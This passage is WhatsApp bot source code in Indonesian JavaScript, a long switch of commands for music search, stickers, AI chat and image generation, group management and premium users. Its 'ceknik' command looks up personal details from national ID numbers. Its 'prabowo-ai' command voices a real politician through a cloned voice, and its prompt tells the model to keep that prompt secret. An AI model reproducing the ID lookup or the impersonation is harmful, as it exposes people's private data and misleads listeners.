responseText += `*${index + 1}.* ${track.name} - ${track.artists}\n`;
});
responseText += `\n_KyuuRzy Universe ( Spotify Search )_`   
const { key } = await ZetInc.reply(m.chat, responseText, m);   
settings.spotifyPlay[m.sender] = {
result,
key,
title,
timeout: setTimeout(() => {
ZetInc.sendMessage(m.chat, { delete: key })
delete settings.spotifyPlay[m.sender]
}, 60 * 1000)
}
};
break
        
case 'claim': {
if (args.length == 0) return ZetInc.sendText(m.chat, `Harap masukan Kode FreeGiftmu!`, m);
if (!global.db.data.codes) {
global.db.data.codes = {
KyuuGanteng: [],
KyuuRzy: [],
kyuurzy: [],
kiuu: []
};
}

let usedUsers = global.db.data.codes[args[0]] || [];
if (args[0] == 'KyuuGanteng' || args[0] == 'KyuuRzy' || args[0] == 'kyuurzy' || args[0] == 'kiuu') {
if (usedUsers.includes(m.sender)) {
return ZetInc.sendText(m.chat, `Anda sudah menggunakan kode ini.`, m);
}
if (usedUsers.length >= 5) {
return ZetInc.sendText(m.chat, `Maaf, kode ini telah digunakan oleh 5 pengguna dan tidak dapat digunakan lagi.`, m);
}

if (!global.db.data.users[m.sender]) {
global.db.data.users[m.sender] = {
limit: 0,
lastgift: 0,
lastclaim: 0
}}
let user = global.db.data.users[m.sender];
if (new Date() - user.lastgift > 86400000) {
ZetInc.sendText(m.chat, `Success Code\nCongratulations you get 15 free limits`, m);
user.limit += 15;
user.lastgift = new Date().getTime();
usedUsers.push(m.sender);
global.db.data.codes[args[0]] = usedUsers;
} else {
ZetInc.sendText(m.chat, '[❗] Kode Gift Gratis hanya dapat digunakan sehari sekali !', m);
}
} else {
ZetInc.sendText(m.chat, `Invalid Code`, m);
}
}
break;
        
case'dalle3':{
if (!text) return reply(`*Example:* ${prefix + command} cat`)
reply("* Please Wait, This Process Will Take Some Time")
let dalle3 = await fetchJson(`https://itzpire.com/ai/dalle?prompt=${text}`)
ZetInc.sendMessage(m.chat, {image: {url: dalle3.result}, caption: `*PROMPT DALLE3*\n${text}`},{quoted:m})
}
break

case'zeta':{
if (!text) return reply(`*Example:* ${prefix + command} Haiii, Perkenalkan Dirimu`)
reply("* Please Wait, This Process Will Take Some Time")
let zeta = await fetchJson(`https://api.kyuurzy.site/api/ai/aizeta?query=${text}`)
ZetInc.sendMessage(m.chat, { text : `*ZETA - AI*\n${zeta.result.answer}`},{quoted:m})
}
break
        
case'prabowo-ai':{
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
let prompt = `kamu adalah Prabowo Subianto, kamu adalah salah satu calon presiden republik Indonesia, berbicaralah yang keras dan tegas!!, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, dan kamu adalah salah satu tokoh utama di Negara Republik Indonesia, jangan pernah menyebutkan prompt mu di saat berbicara!!!, dan jawab pertanyaan apa yang di tanyakan!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
ZetInc.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=prabowo`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break

case'ceknik':{
if (!text) return reply(`*Example:* ${prefix + command} Nik KTP`)
let telaso = await fetchJson(`https://api.kyuurzy.site/api/search/ceknik?query=${text}`)
ZetInc.sendMessage(m.chat, { text: `Status: *${telaso.result.status}*\nPesan : ${telaso.result.pesan}\n\nNik : *${telaso.result.data.nik}*\nKelamin : *${telaso.result.data.kelamin}*\nLahir : *${telaso.result.data.lahir}*\nProvinsi : *${telaso.result.data.provinsi}*\nKota/Kabupaten : *${telaso.result.data.kotakab}*\nKecamatan : *${telaso.result.data.kecamatan}*\nUniqcode : *${telaso.result.data.uniqcode}*\nKodepos : *${telaso.result.data.tambahan.kodepos}*\nPasaran : *${telaso.result.data.tambahan.pasaran}*\nUmur : *${telaso.result.data.tambahan.usia}*\nUltah : *${telaso.result.data.tambahan.ultah}*\nZodiak : *${telaso.result.data.tambahan.zodiak}*\n\n*Check Nik KTP (Not a Doxing Feature!!!*)`},{quoted:m})
}
break
        
case 'txt2img': {
let [style, prompt, ratio, sampler] = text.split('|');
if (!text) return zreply(`*Example:* ${prefix + command} Anime |Girl, sunset|1024 x 1024|DPM++ 2M SDE Karras`);
await reply(global.bugrespon);
try {
     let loli = await animagine({
         style: style.trim(),
         prompt: prompt.trim(),
         ratio: ratio.trim(),
         sampler: sampler.trim(),
        });
        if (loli && loli[0] && loli[0].image && loli[0].image.url) {
            await ZetInc.sendMessage(m.chat, { image: { url: loli[0].image.url }, caption: `*TXT2IMG ANIME*\n${text}` }, { quoted: m });
        } else {
            throw new Error('No image URL found.');
        }
    } catch (error) {
        console.error('Error:', error);
        await zreply('An error occurred while processing your request.');
    }
}
break;    
        
case "sendgroup": case "sendgc": {
if (!isCreator) return reply(mess.owner);
let gcall = await Object.values(await ZetInc.groupFetchAllParticipating().catch(_=> null));
let num = [];
let listgc = `*Example*: ${prefix + command} Nomor Grup Pesan\n\n`;
await gcall.forEach((u, i) => { num.push(i);
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`});
if (!args[0]) {
ZetInc.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnailUrl: global.thumbnail, title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.url, previewType: "PHOTO"}}}, {quoted: tes});
} else if (args[0] && args[1]) {
if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan");
let targetGroup = Number(args[0]) - 1;
let messageText = args.slice(1).join(' ');
await ZetInc.sendUrlKu(gcall[targetGroup].id, messageText, `_Pesan Dari Owner_`);
await reply(`Pesan berhasil dikirim ke grup:\n*${gcall[targetGroup].subject}*\n\nPesan: ${messageText}`);
}
}
break;
           
case "leavegc": case "leave": {
if (!isCreator) return reply(mess.owner)
let gcall = await Object.values(await ZetInc.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Example*: ${prefix + command} Nomor Grup`
await gcall.forEach((u, i) => {
num.push(i)
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
ZetInc.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnailUrl: global.thumbnail, title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.url, previewType: "PHOTO"}}}, {quoted: tes})
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await ZetInc.groupLeave(`${gcall[leav].id}`)
}}
break

case'ceksn':{
let __waktutionskh = (new Date - global.db.data.users[sender].snlast)
let _waktutionskh = (+ 1000 - __waktutionskh)
let waktutionskh = clockString(_waktutionskh)
if (new Date - global.db.data.users[m.sender].snlast > + 1000) {
   	global.db.data.users[m.sender].snlast = new Date * 1
    global.db.data.users[m.sender].limit -= 5
const { createHash } = require('crypto')
let sn = createHash('md5').update(m.sender).digest('hex')
let pp = await ZetInc.profilePictureUrl(m.sender, 'image').catch((_) => "https://telegra.ph/file/24fa902ead26340f3df2c.png")
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Hello, @${pushname}* 👋\ndi bawah ini adalah code sn anda\nklik "copy" untuk mendapatkan code sn`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
          }),
          header: proto.Message.InteractiveMessage.Header.create({
           // hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: pp } }, { upload: ZetInc.waUploadToServer }))
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"${sn}\"}`
              },
           ],
          })
        })
    }
  }
}, { userJid: m.chat, quoted: m })
ZetInc.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
    } else ZetInc.reply(m.chat, `Kamu sudah unreg..\nMohon tunggu ${waktutionskh} untuk bisa kembali unreg`, m)
}
break
        
case'unreg': {
if (!args[0]) return reply(`*Example*: ${prefix + command} dc7cf584fab72e53fc72bdd557388c93`)
  const { createHash } = require('crypto')
  let user = global.db.data.users[sender]
  let sn = createHash('md5').update(m.sender).digest('hex')
  if (args[0] !== sn) throw 'Serial Number salah'
   let __waktuh = (new Date - global.db.data.users[sender].unreglast)
   let _waktuh = (+ 1000 - __waktuh)
   let waktuh = clockString(_waktuh)
   if (new Date - global.db.data.users[m.sender].unreglast > + 1000) {
   user.unreglast = new Date * 1
  user.registered = false
  zreply(`Unreg berhasil!`)
  } else zreply(`Kamu sudah *unreg*..\nMohon tunggu ${waktuh} untuk bisa *unreg* kembali..`)
}
break
        
case'ceklimit':
case'limitku':{
replymenuu(`Limit : ${limitnya}
User : ${isCreator ? 'Owner' : 'User'}
Status : ${isPremium ? 'Premium' : 'Free'}`
)}
break
        
case 'regmail': {
try {
let users = global.db.data.users[m.sender];
let name = await ZetInc.getName(m.sender);
let nodemailer = require("nodemailer");
if (m.isGroup) return reply(`Use in Private Chat!!!`);
if (users.registered === true) return reply(`✅ Your number already verified.`);
if (!args || !args[0]) return ZetInc.reply(m.chat, `*Example:* ${prefix + command}`, m);

await ZetInc.sendReact(m.chat, `⏳`, m.key);
await sleep(2000);
ZetInc.sendReact(m.chat, `✅`, m.key);
reply(`Please Check Messages in Your Gmail`);

const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/i;
if (!emailRegex.test(args[0])) {
return ZetInc.reply(m.chat, `🚩 Invalid email.`, m);
}

let code = `${getRandomint(100, 900)}-${getRandomint(100, 900)}`;
let kemii = m.sender.split("@")[0];
 users.codeExpire = Date.now();
 users.code = code;
 users.email = args[0];
 users.isVerifying = true; 

 let transporter = nodemailer.createTransport({
     service: 'gmail',
     host: 'smtp.gmail.com',
     port: 587,
     secure: false,
     auth: {
     user: 'kyuurzy',
     pass: 'kyuudev'
     }
        });

        // Opsi email
        let mailOptions = {
            from: 'kyuurzy@gmail.com',
            to: args[0],
            subject: 'Email Verification',
            html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>pp</title>
</head>
<body>
  <div style="border: 1px solid #ccc; padding: 20px; font-family: monospace;">
    <div style="background-color: rgba(255, 255, 255, 0.7); padding: 20px; border-radius: 10px">
       <h2 style="color: #00000">Haii ${name}</h2>
                  <p>Register Gmail First So You Can Use Bot WhatsApp</p>
        <p>Confirm your email to be able to use Kiku-san. Send this code to the bot and it will expire in 3 minutes.</p>
        <div style="background-color: #e5e5e5; padding: 10px; text-align: center; font-size: 18px; font-weight: bold">
        <div style="text-align: center; font-family: monospace;">
        <div style="background-color: #e5e5e5; padding: 10px; text-align: center; font-size: 18px; font-weight: bold">
             ${code}
                  </div>
          <hr style="display: inline-block; margin-top: 20px; margin-bottom: 20px; width: 60%;">
          <p style="font-size: 12px; display: inline-block;">Or copy and paste the URL below into your browser : https://wa.me/${owner}?text=${code}</p>
        </div>
      </div>
</body>
</html>`
        };
transporter.sendMail(mailOptions);
if (m.isGroup) return reply(`Please Check Messages in Your Gmail`);
} catch (e) {
ZetInc.reply(m.chat, `Error: ${e.message}`, m);
}
}
break;
        
case "setppbot":{
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`Reply foto dgn caption ${prefix + command}`);
if (!/image/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`);
if (/webp/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`);
let media = await ZetInc.downloadAndSaveMediaMessage(quoted);
var { img } = await generateProfilePicture(media);
await ZetInc.query({
tag: "iq",
attrs: {
to: botNumber,
type: "set",
xmlns: "w:profile:picture",
},
content: [
{
tag: "picture",
attrs: { type: "image" }, content: img },
]});
reply("Done!!!");
}
break;
        
case'menfess':{
ZetInc.menfess = ZetInc.menfess ? ZetInc.menfess : {}
if (!text) return reply(`*Example:* ${prefix + command} nomor|nama pengirim|pesan`);
let [jid, name, pesan] = text.split('|');
if ((!jid || !name || !pesan)) return reply(`*Penggunaan Salah*\n*Example:* ${prefix + command} nomor|nama pengirim|pesan`);
jid = jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let data = (await ZetInc.onWhatsApp(jid))[0] || {};
if (!data.exists) return reply('Nomer tidak terdaftar di whatsapp.');
    
let mf = Object.values(ZetInc.menfess).find(mf => mf.status === true)
if (mf) return !0
try {
let id = + new Date
let txt = `Hai @${data.jid.split('@')[0]}, kamu menerima pesan Menfess nih.\n\nDari: *${name}*\nPesan: \n${pesan}\n\nMau balas pesan ini kak? bisa kak. kakak tinggal ketik pesan kakak nanti saya sampaikan ke *${name}*.`.trim();
 await ZetInc.reply(data.jid, txt, m)
        .then(() => {
            zreply('Berhasil mengirim pesan menfess.')
            ZetInc.menfess[id] = {
                id,
                dari: m.sender,
                nama: name,
                penerima: data.jid,
                pesan: pesan,
                status: false
            }
            return !0
        })
    } catch (e) {
        console.log(e)
        zreply('error');
    }
}
break
        
case 'addprem': {
if (!isCreator) return reply(mess.owner)
if (args.length < 2)
return reply(`*Example:* ${prefix + command} @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
reply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
reply("Sukses Via Nomer")
await sleep(2000)
ZetInc.sendMessage(args[0] + "@s.whatsapp.net", {text: `Kamu sekarang adalah Anggota Premium`},{quoted: tes })
}
}
break
        
case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`*Example:* ${prefix + command} @tag`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya));
reply("Sukses Delete");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
orgkaya.splice(targetPremiumIndex, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya))
reply("Sukses Via Nomer")
await sleep(2000)
ZetInc.sendMessage(targetNumber, {text: `Status Premium Mu Telah Habis/Dicabut`},{quoted: tes })
} else {
reply("Entitas premium tidak ditemukan")
}
}
}
break
        
case'play':{
if (!text) return reply(`*Example:* ${prefix + command} photograph`)
const randomReduction = Math.floor(Math.random() * 5) + 1;
let search = await yts(text);
let telaso = search.all[0].url;

const pluvi = `*Music - Play*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}`

const baten = new Button();
let ads = baten.setBody(pluvi);
ads += baten.setImage(search.all[0]. thumbnail);
ads += baten.addReply("Song", `#ytmp3 ${telaso}`);
ads += baten.addReply("Video", `#ytmp4 ${telaso}`);
ads += baten.run(m.chat, ZetInc, m)
}
break
        
case 'autoai':
 if (!isCreator) return reply(mess.owner)
 if (args.length < 1) return zreply(`*Example :* ${prefix + command} on/off`)
 if (q == 'on') {
 global.db.data.chats[m.chat].ai = true
 zreply('Sukses mengaktifkan chat ai')
 } else if (q == 'off') {
 global.db.data.chats[m.chat].ai = false
 zreply('Sukes menonaktifkan chat ai')
 } else {
 zreply(`Penggunaan Salah\n*Example :* ${prefix + command} on/off`)
 }
 break
        
case'jadian':
case'love':{
if (limitnya < 1) return zreply(mess.limit)
if (!m.isGroup) return reply(mess.group);
let member = participants.map((u) => u.id);
let orang = member[Math.floor(Math.random() * member.length)];
let jodoh = member[Math.floor(Math.random() * member.length)];
ZetInc.sendMessage(m.chat,{ text: `@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]} Ciee❤️💖👀`, contextInfo: {mentionedJid: [orang, jodoh], isForwarded: true, externalAdReply: {
title: `Hallo Kak ${pushName}`,
body: `${runtime(process.uptime())}`,
thumbnailUrl: global.thumbnail,
sourceUrl: global.url,
mediaType: 1,
renderLargerThumbnail: false,
}}},
{ quoted: m })
uselimit()
}
break;
        
case 'get': {
if (!text) { return ZetInc.reply(m.chat, `awali *URL* dengan http:// atau https://`, m)}
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return ZetInc.editmsg("execute", JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return ZetInc.editmsg("execute", textData);
} else if (text.includes('webp')) {
return ZetInc.sendImageAsSticker(m.chat, text, m, { packname: packname, author: author })
} else if (/image/i.test(contentType)) { return ZetInc.sendMessage(m.chat, { image: { url: text }}, { quoted: m });
} else if (/video/i.test(contentType)) { return ZetInc.sendMessage(m.chat, { video: { url: text }}, { quoted: m });
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return ZetInc.sendMessage(m.chat, { audio: { url: text }}, { quoted: m });
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return ZetInc.sendFile(m.chat, text, '', text, m)			
} else if (/application\/pdf/i.test(contentType)) {
return ZetInc.sendFile(m.chat, text, '', text, m)
} else {
return ZetInc.editmsg("execute", `MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return ZetInc.editmsg("execute", `Terjadi kesalahan saat mengakses URL: ${error.message}`);
}}
break 
        
case 'addplug': {
if (!isCreator) return reply(mess.owner)
if (!q.includes("|")) return reply(`Add input, Example: *${prefix + command} name|category|content*`)
const [
pluginName,
category, ...pluginContent
] = q.split("|")
const pluginDirPath = path.join(path.resolve(__dirname, './plugin', category))
const pluginFilePath = path.join(pluginDirPath, pluginName + ".js")
if (!q.includes("|") || pluginContent.length === 0 || fs.existsSync(pluginFilePath)) return
if (!fs.existsSync(pluginDirPath)) fs.mkdirSync(pluginDirPath, {
recursive: true
})
fs.writeFileSync(pluginFilePath, pluginContent.join('|'))
await reply(`Plugin baru telah dibuat di ${pluginFilePath}.`)
}
break

case 'cgplug': {
if (!isCreator) return reply(mess.owner)
if (!q.includes("|")) return reply(`Add Input, Example: *${prefix + command} thisplug|newcontent*`)
let [mypler, ...rest] = q.split("|")
let mypenis = rest.join("|")
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(mypler)) {
let filePath = plugin.filePath
fs.writeFileSync(filePath, mypenis)
await reply(`Plugin di ${filePath} telah diganti`)
return
}
}
await reply(`Plugin dengan command '${mypler}' tidak ditemukan`)
}
break

case 'rmplug': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`Please provide the command name of the plugin you want to remove. Example: *${prefix + command} thisplug*`)
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(q)) {
let filePath = plugin.filePath
fs.unlinkSync(filePath)
await reply(`Plugin di ${filePath} telah dihapus.`)
return
}
}
await reply(`Plugin dengan command '${q}' tidak ditemukan.`)
}
break

case 'getplug': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`Add Input, Example: *${prefix + command} ryocakep*`)
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugin = loadPlugins(pluginsDirect).find(p => p.command.includes(q)) // Perubahan disini
if (!plugin) return reply(`Plugin dengan command '${q}' tidak ditemukan.`)
await ZetInc.sendMessage(m.chat, {
document: fs.readFileSync(plugin.filePath),
fileName: path.basename(plugin.filePath),
mimetype: '*/*'
}, {
quoted: m
})
await reply(`Succes mengambil plugin '${q}', plugin telah dikirim.`)
}
break
      
case "ocr":{
if (limitnya < 1) return zreply(mess.limit)
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return reply(`balas gambar dengan perintah ${prefix + command}`)
if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await ZetInc.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
await reply(hasil.ParsedResults[0].ParsedText)
uselimit()
}
break
        
case 'qc': {
try {
const dia = (m.quoted?.text ? m.quoted : m).sender;
const name = await ZetInc.getName(dia);
let teks = m.quoted ? m.quoted.text : q ? q : "";
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
const avatar = await ZetInc.profilePictureUrl(dia, "image").catch(_ => "https://telegra.ph/file/89c1638d9620584e6e140.png");
if (isImage || isQuotedImage) {
let media = await ZetInc.downloadAndSaveMediaMessage(quoted, makeid(5));
let anu = await TelegraPh(media);
const json = {
type: "quote",
format: "png",
backgroundColor: "apiColor",
width: 512,
height: 768,
scale: 2,
messages: [{
entities: [],
media: {
url: anu
},
avatar: true,
from: {
id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
name,
photo: {
url: avatar
}
},
text: `${teks}`,
replyMessage: {}
}]
};
const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
headers: {
"Content-Type": "application/json"
}
}).catch(e => e.response || {});
if (!data.ok) throw data;
const buffer = Buffer.from(data.result.image, "base64");
makeSticker(buffer, Sticker, StickerTypes);
fs.unlinkSync(media);
} else if (q.mtype == 'stickerMessage' || q.mtype === 'imageMessage') {
let img = await q.download();

ZetInc.sendMessage(m.chat, {
react: {
text: "🕛",
key: m.key,
},
});
let up;
if (/webp/g.test(mime)) {
up = await webp2png(img);
} else if (/image/g.test(mime)) {
up = await uploadImage(img);
} else ''

let obj = {
"type": "quote",
"format": "png",
"backgroundColor": "#ffffffff",
"width": 512,
"height": 768,
"scale": 2,
"messages": [{
"entities": [],
"media": { "url": up },
"avatar": true,
"from": {
"id": 1,
"name": m.name,
"photo": { "url": pp }
},
"text": text,
"replyMessage": {}
}]
};

const buffer = await Quotly(obj);

let stiker = await sticker(buffer, false, global.packname, global.author);
if (stiker) return ZetInc.sendFile(m.chat, stiker, 'Quotly.webp', '', m);
ZetInc.sendMessage(m.chat, {
react: {
text: "✅",
key: m.key,
},
});

} else {
const json = {
type: "quote",
format: "png",
backgroundColor: apiColor,
width: 512,
height: 768,
scale: 2,
messages: [{
entities: [],
avatar: true,
from: {
id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
name,
photo: {
url: avatar
}
},
text: `${teks}`,
replyMessage: {}
}]
};
const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
headers: {
"Content-Type": "application/json"
}
}).catch(e => e.response || {});
if (!data.ok)zreply(data);
const buffer = Buffer.from(data.result.image, "base64");
makeSticker(buffer, Sticker, StickerTypes);
/*
let patth = await getRandom('.jpg') 
let r = await UrlToPath(avatar,patth)
let ava = await TelegraPh (patth).catch(_ => TelegraPh (patth))
let data = `https://mineApi/api/qc?text=${teks}&username=${name}&avatar=${ava}`
makeSticker(data,Sticker, StickerTypes)
fs.unlinkSync(patth)
*/
}
} catch (e) {
zreply('sistem eror coba lagi nanti');
console.log(e);
return;
}
uselimit()
}
// db.data.users[sender].limit -= 1 // -1 limit
break;      
        
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ZetInc.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ZetInc.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
        
case 'smeme': {
if (limitnya < 1) return zreply(mess.limit)
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return reply(respond)
if (!text) return zreply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ZetInc.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await ZetInc.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
uselimit()
}
break  
        
case 'ss': case 'ssweb':{
if (limitnya < 1) return zreply(mess.limit)
if (!/^https?:\/\//.test(text)) return zreply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
ZetInc.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:m})
uselimit()
}
break
        
case "tr":
case "translate":{
let lang, text
if (limitnya < 1) return zreply(mess.limit)
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else return reply(`Ex: ${prefix + command} id hello i am robot`)
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return zreply(`Error : Bahasa"${lang}" Tidak Support`)
reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
uselimit()
}
break
        
case'telestick':{
if (limitnya < 1) return zreply(mess.limit)
if (args.length == 0) return reply(`*Example*: ${prefix + command} https://t.me/addstickers/bocchi_ryo_y0ursfunny_akaudon`)
if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
let res = await Telesticker(args[0]);
await zreply(`Sending ${res.length} stickers...`);
if (m.isGroup && res.length > 30) {
await zreply("Number of stickers more than 30, bot will send it in private chat.",
);
for (let i = 0; i < res.length; i++) {
let encmedia = await ZetInc.sendImageAsSticker(m.sender, res[i].url, m, { packname: packname, author: author})
await fs.unlinkSync(encmedia)
await sleep(9000)
}
} else {
for (let i = 0; i < res.length; i++) {
let encmedia = await ZetInc.sendImageAsSticker(m.chat, res[i].url, m, { packname: packname, author: author });
await fs.unlinkSync(encmedia)
await sleep(9000)
}
}
}
uselimit()
}
break
        
case 'kisahnabi': {
if (limitnya < 1) return zreply(mess.limit)
if (!text) return zreply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return zreply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*— — — — — — ${m2}[ K I S A H ]${m2} — — — — — —*

${kisah.description}`

zreply(`${hasil}`)
uselimit()
}
break
        
case 'asmaulhusna': {
if (limitnya < 1) return zreply(mess.limit)
const contoh = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
